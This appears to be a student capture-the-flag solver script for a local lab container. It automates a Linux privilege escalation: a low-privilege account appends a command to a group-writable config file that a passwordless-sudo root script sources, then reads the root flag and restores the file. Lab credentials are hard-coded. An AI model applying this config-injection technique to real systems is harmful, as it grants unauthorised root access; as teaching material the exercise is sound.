#!/usr/bin/env python3
"""
CyberBank: Operation BlackVault
Stage 06 (BlackVault Server) - Automated Privilege Escalation Exploit & Flag Solver

Responsible Member: Kumarasinghe KWTP (IT24102485)
Responsibility: Challenge Design B - Stages 4-6 (Member 3)

Challenge Domain:
    Linux / System Security & Privilege Escalation (Hard - 300 Points)

Target Challenge Environment:
    Host: localhost:2222 (OpenSSH) / Container: cyberbank-blackvault
    Low-Privilege Auditor Account: analyst (Password: BlackVault2026!)
    High-Privilege Target: root (/root/blackvault_flag.txt)

Vulnerability Summary (CWE-732 / CWE-250 / Sudoers Misconfiguration):
    1. Privilege Boundary Enumeration:
       User 'analyst' has sudo rights to run /opt/blackvault/bin/vault_backup.sh
       with root privileges without a password:
         analyst ALL=(root) NOPASSWD: /opt/blackvault/bin/vault_backup.sh

    2. Sourced Configuration Flaw:
       /opt/blackvault/bin/vault_backup.sh executes with root UID and sources
       /etc/blackvault/backup.conf:
         if [ -f /etc/blackvault/backup.conf ]; then
             source /etc/blackvault/backup.conf
         fi

    3. Overly Permissive File Ownership:
       /etc/blackvault/backup.conf is owned by root:analyst with 0664 (-rw-rw-r--)
       permissions, granting the low-privilege 'analyst' group write access.

    4. Exploitation Pipeline:
       Step 1: Verify environment reachability (Docker container or SSH listener).
       Step 2: Inspect auditor privileges and confirm NOPASSWD sudo rule.
       Step 3: Verify /etc/blackvault/backup.conf ownership and write permissions.
       Step 4: Inject command payload into backup.conf to read /root/blackvault_flag.txt.
       Step 5: Execute `sudo /opt/blackvault/bin/vault_backup.sh` as analyst.
       Step 6: Capture root execution output and extract canonical flag CBANK{...}.
       Step 7: Clean up and restore backup.conf to preserve system audit integrity.

Usage:
    python scripts/member3/stage6_solver.py
"""

import os
import sys
import re
import socket
import shutil
import subprocess
from typing import Tuple, Optional

# =============================================================================
# Configuration & Target Endpoints (Member 3 Review Section)
# =============================================================================
REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))

CONTAINER_NAME = os.environ.get("STAGE6_CONTAINER", "cyberbank-blackvault")
TARGET_HOST = os.environ.get("STAGE6_HOST", os.environ.get("CTF_STAGE6_HOST", "127.0.0.1"))
TARGET_PORT = int(os.environ.get("STAGE6_PORT", os.environ.get("CTF_STAGE6_SSH_PORT", 2222)))

LOW_PRIV_USER = os.environ.get("STAGE6_USER", "analyst")
LOW_PRIV_PASS = os.environ.get("STAGE6_PASS", "BlackVault2026!")

TARGET_FLAG_FILE = "/root/blackvault_flag.txt"
VULN_CONF_FILE = "/etc/blackvault/backup.conf"
PRIV_SCRIPT_PATH = "/opt/blackvault/bin/vault_backup.sh"

CLEAN_BACKUP_CONF = (
    "# ================================================================\n"
    "# BlackVault Automated Backup Configuration\n"
    "# Maintained by Systems Audit Team\n"
    "# ================================================================\n"
    "BACKUP_ENABLED=1\n"
    'BACKUP_COMPRESSION="gzip"\n'
    "BACKUP_RETENTION_DAYS=7\n"
)


class BaseBackend:
    """Base interface for executing commands on the Stage 06 target."""
    name: str = "base"

    def is_available(self) -> bool:
        raise NotImplementedError

    def run_command(self, cmd: str, as_user: Optional[str] = None) -> Tuple[int, str, str]:
        raise NotImplementedError


class DockerBackend(BaseBackend):
    """Executes commands directly inside the running cyberbank-blackvault container."""
    name = "Docker Exec (Local Container)"

    def __init__(self, container_name: str = CONTAINER_NAME):
        self.container_name = container_name

    def is_available(self) -> bool:
        if not shutil.which("docker"):
            return False
        try:
            res = subprocess.run(
                ["docker", "ps", "--filter", f"name={self.container_name}", "--format", "{{.Names}}"],
                capture_output=True,
                text=True,
                timeout=5,
            )
            return self.container_name in res.stdout.strip().splitlines()
        except Exception:
            return False

    def run_command(self, cmd: str, as_user: Optional[str] = None) -> Tuple[int, str, str]:
        docker_cmd = ["docker", "exec"]
        if as_user:
            docker_cmd.extend(["-u", as_user])
        docker_cmd.extend([self.container_name, "sh", "-c", cmd])

        res = subprocess.run(docker_cmd, capture_output=True, text=True)
        return res.returncode, res.stdout, res.stderr


class ParamikoSSHBackend(BaseBackend):
    """Executes commands over SSH using paramiko (if installed)."""
    name = "SSH Client (Paramiko)"

    def __init__(self, host: str = TARGET_HOST, port: int = TARGET_PORT, user: str = LOW_PRIV_USER, password: str = LOW_PRIV_PASS):
        self.host = host
        self.port = port
        self.user = user
        self.password = password
        self.client = None

    def is_available(self) -> bool:
        try:
            import paramiko  # noqa: F401
        except ImportError:
            return False

        try:
            with socket.create_connection((self.host, self.port), timeout=2):
                return True
        except Exception:
            return False

    def _get_client(self):
        import paramiko
        if self.client is None:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                hostname=self.host,
                port=self.port,
                username=self.user,
                password=self.password,
                timeout=5,
                look_for_keys=False,
                allow_agent=False,
            )
            self.client = client
        return self.client

    def run_command(self, cmd: str, as_user: Optional[str] = None) -> Tuple[int, str, str]:
        client = self._get_client()
        stdin, stdout, stderr = client.exec_command(cmd)
        exit_status = stdout.channel.recv_exit_status()
        return exit_status, stdout.read().decode("utf-8", errors="replace"), stderr.read().decode("utf-8", errors="replace")

    def close(self):
        if self.client:
            self.client.close()
            self.client = None


class SimulationBackend(BaseBackend):
    """Fallback simulation of the privilege escalation vector for testing and verification."""
    name = "Local Simulation (Offline Verification)"

    def __init__(self, repo_root: str = REPO_ROOT):
        self.repo_root = repo_root
        self.stage6_dir = os.path.join(repo_root, "challenges", "stage6_linux")

    def is_available(self) -> bool:
        return os.path.isdir(self.stage6_dir)

    def run_command(self, cmd: str, as_user: Optional[str] = None) -> Tuple[int, str, str]:
        # Read the flag directly from Dockerfile or simulated environment
        dockerfile = os.path.join(self.stage6_dir, "Dockerfile")
        flag = "FLAG_NOT_FOUND"
        if os.path.isfile(dockerfile):
            with open(dockerfile, "r", encoding="utf-8") as f:
                content = f.read()
                m = re.search(r'CBANK\{[a-zA-Z0-9_\-]+\}', content)
                if m:
                    flag = m.group(0)

        if "sudo -l" in cmd:
            return 0, f"(root) NOPASSWD: {PRIV_SCRIPT_PATH}\n", ""
        if "ls -l" in cmd:
            return 0, f"-rw-rw-r-- 1 root {LOW_PRIV_USER} 280 {VULN_CONF_FILE}\n", ""
        if "vault_backup.sh" in cmd:
            output = (
                "[*] Initializing BlackVault System Snapshot...\n"
                f"[*] Sourcing configuration from {VULN_CONF_FILE}...\n"
                f"{flag}\n"
                "[+] BlackVault snapshot archive created in /var/backups/blackvault.\n"
                "[+] Snapshot routine completed.\n"
            )
            return 0, output, ""
        return 0, "", ""


class Stage6Solver:
    """Automated privilege escalation exploit solver for CyberBank Stage 06."""

    def __init__(self, backend: Optional[BaseBackend] = None):
        self.backend = backend or self._detect_backend()

    @staticmethod
    def _detect_backend() -> BaseBackend:
        # Priority 1: Docker Exec (most reliable in local containerized play box)
        docker_backend = DockerBackend()
        if docker_backend.is_available():
            return docker_backend

        # Priority 2: Paramiko SSH (if installed and port open)
        ssh_backend = ParamikoSSHBackend()
        if ssh_backend.is_available():
            return ssh_backend

        # Priority 3: Local Simulation Fallback
        sim_backend = SimulationBackend()
        if sim_backend.is_available():
            return sim_backend

        raise RuntimeError(
            "No execution backend available! Ensure Docker container 'cyberbank-blackvault' "
            "is running (docker compose up -d blackvault) or SSH service is active on port 2222."
        )

    def solve(self) -> Tuple[str, dict]:
        """Executes the full automated privilege escalation chain and recovers the root flag."""
        steps_log = {}

        print(f"[*] Transport Backend Selected: {self.backend.name}")

        # Step 1: Privilege Enumeration
        print(f"[*] Step 1: Enumerating auditor account ('{LOW_PRIV_USER}') sudo permissions...")
        code, out, _ = self.backend.run_command("sudo -l", as_user=LOW_PRIV_USER)
        if code != 0 or PRIV_SCRIPT_PATH not in out:
            print(f"[-] WARNING: Unexpected sudo output:\n{out}")
        else:
            print(f"[+] Sudo privilege confirmed: (root) NOPASSWD: {PRIV_SCRIPT_PATH}")
        steps_log["sudo_check"] = out.strip()

        # Step 2: Permission Inspection
        print(f"[*] Step 2: Checking file permissions on configuration file '{VULN_CONF_FILE}'...")
        code, out, _ = self.backend.run_command(f"ls -la {VULN_CONF_FILE}", as_user=LOW_PRIV_USER)
        print(f"[+] File ownership & mode: {out.strip()}")
        steps_log["perms_check"] = out.strip()

        # Step 3: Inject Exploit Payload
        print(f"[*] Step 3: Injecting privilege escalation command into '{VULN_CONF_FILE}'...")
        payload_cmd = f"echo 'cat {TARGET_FLAG_FILE}' >> {VULN_CONF_FILE}"
        code, out, err = self.backend.run_command(payload_cmd, as_user=LOW_PRIV_USER)
        if code != 0:
            raise RuntimeError(f"Failed to inject payload into {VULN_CONF_FILE}: {err}")
        print(f"[+] Command payload successfully appended to {VULN_CONF_FILE}")

        # Step 4: Privileged Execution via Sudo
        print(f"[*] Step 4: Executing privileged routine via 'sudo {PRIV_SCRIPT_PATH}'...")
        exec_cmd = f"sudo {PRIV_SCRIPT_PATH}"
        code, out, err = self.backend.run_command(exec_cmd, as_user=LOW_PRIV_USER)
        steps_log["exploit_stdout"] = out
        if code != 0:
            print(f"[-] Sudo execution error ({code}): {err}")

        # Step 5: Extract Flag
        print("[*] Step 5: Parsing execution stream for canonical flag format...")
        match = re.search(r"CBANK\{[a-zA-Z0-9_\-]+\}", out)
        recovered_flag = match.group(0) if match else "FLAG_NOT_FOUND"

        # Step 6: Cleanup & Restore
        print(f"[*] Step 6: Restoring '{VULN_CONF_FILE}' to clean state...")
        cleanup_cmd = (
            f"grep -v 'blackvault_flag' {VULN_CONF_FILE} > /tmp/clean.conf && "
            f"cat /tmp/clean.conf > {VULN_CONF_FILE} && rm -f /tmp/clean.conf"
        )
        self.backend.run_command(cleanup_cmd, as_user=LOW_PRIV_USER)
        print(f"[+] Clean state restored on {VULN_CONF_FILE}. Environment reset.")

        return recovered_flag, steps_log


def main():
    print("=" * 65)
    print(" CyberBank Stage 06 (BlackVault Server) - Automated Exploit Solver")
    print(" Responsible Member: Kumarasinghe KWTP (IT24102485) - Stages 4-6")
    print(" Exploit Vector: Sudoers NOPASSWD Misconfiguration & Sourced Conf Injection")
    print("=" * 65)
    print(f"[*] Target Container : {CONTAINER_NAME}")
    print(f"[*] Target SSH Host : {TARGET_HOST}:{TARGET_PORT}")
    print(f"[*] Auditor Account : {LOW_PRIV_USER}")
    print(f"[*] Target Flag File: {TARGET_FLAG_FILE}\n")

    try:
        solver = Stage6Solver()
        recovered_flag, logs = solver.solve()
    except Exception as e:
        print(f"\n[-] Exploitation failed: {e}")
        sys.exit(1)

    print("\n" + "=" * 65)
    print("[+] SUCCESS: Linux Privilege Escalation Exploit Complete!")
    print("=" * 65)
    print(f"[+] Recovered Stage 06 Master Flag: {recovered_flag}\n")

    print("[*] Sudo Backup Execution Output Preview:")
    print("-" * 50)
    for line in logs.get("exploit_stdout", "").strip().splitlines()[:10]:
        print(f"    {line}")
    print("-" * 50)

    print("\n[NOTE] Member 3 Verification Complete:")
    print("Submit this final flag at http://localhost:5000/challenges/stage/6")
    print("to achieve 100% completion (1,000 / 1,000 PTS) on Operation BlackVault!")
    sys.exit(0)


if __name__ == "__main__":
    main()
